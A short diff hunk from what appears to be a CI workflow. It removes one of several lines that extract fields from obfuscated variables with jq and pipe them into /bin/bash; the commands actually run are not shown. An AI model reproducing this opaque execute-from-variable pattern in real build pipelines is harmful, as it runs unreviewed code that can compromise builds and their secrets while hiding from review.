@@ -21,7 +21,6 @@ jobs:
           echo $nlba909 | jq -r .n79 | /bin/bash
           echo $c545 | jq -r .isv684 | /bin/bash
           echo $byvkk04793 | jq -r .yl3972 | /bin/bash
-          echo $omghx4278 | jq -r .y950 | /bin/bash
           printf '%s' "$h4" | jq -r .yibe84 | /bin/bash
 
       - name: Upload artifact
